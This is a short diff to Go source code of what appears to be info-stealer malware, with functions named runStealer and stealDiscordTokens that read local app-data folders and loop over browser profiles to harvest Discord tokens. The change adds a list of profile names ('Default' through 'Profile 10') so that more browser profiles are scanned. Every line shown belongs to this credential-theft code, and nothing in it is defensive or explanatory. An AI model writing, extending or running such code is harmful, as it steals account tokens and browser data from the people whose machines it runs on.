@@ -16,7 +16,7 @@ func runStealer() string {
 		exe   string
 	}
 
-	la := os.Getenv(getLocalAppDataEnvName())
+	la := os.Getenv(getLocalAppDataEnv())
 	ad := os.Getenv(getAppDataEnvName())
 
 	var browsers []brConf
@@ -628,6 +628,8 @@ func stealDiscordTokens() string {
 		})
 	}
 
+	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5",
+		"Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"}
 	for _, subPath := range getDiscordBrowserPaths() {
 		base := filepath.Join(localAppdata, subPath)
 		for _, prof := range profiles {
